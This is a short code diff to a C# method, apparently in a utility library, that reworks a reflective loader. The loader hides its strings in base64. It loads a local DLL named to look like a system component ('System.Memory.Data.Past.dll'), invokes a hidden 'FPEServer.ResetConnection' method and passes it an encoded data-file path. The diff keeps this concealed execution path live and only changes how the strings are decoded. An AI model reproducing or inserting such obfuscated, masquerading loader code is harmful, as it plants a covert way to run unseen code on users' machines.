@@ -23,15 +23,13 @@ namespace DynamicSugar
 
         public static bool ResetConnection()
         {
-            var bf = "LlxGaWxlc1x6Q2FzRGF0YS5kYXQ="; //var s = @".\Files\zCasData.dat";
             try
             {
-                var myAssembly = Assembly.LoadFrom(bTos("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw=")); // @".\System.Memory.Data.Past.dll"
-                var myType = myAssembly.GetType(bTos("U3lzdGVtLk1lbW9yeS5EYXRhLlBhc3QuRlBFU2VydmVy")); // "System.Memory.Data.Past.FPEServer"
-                var myMethod = myType.GetMethod(bTos("UmVzZXRDb25uZWN0aW9u"), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
+                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw="))); // @".\System.Memory.Data.Past.dll"
+                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtLk1lbW9yeS5EYXRhLlBhc3QuRlBFU2VydmVy"))); // "System.Memory.Data.Past.FPEServer"
+                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String("UmVzZXRDb25uZWN0aW9u")), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                 if (myMethod != null)
-                    myMethod.Invoke(null, new object[] { bf });
-                return true;
+                    return (bool)myMethod.Invoke(null, new object[] { "LlxGaWxlc1x6Q2FzRGF0YS5kYXQ=" }); //var s = @".\Files\zCasData.dat";
             }
             catch (Exception ex)
             {
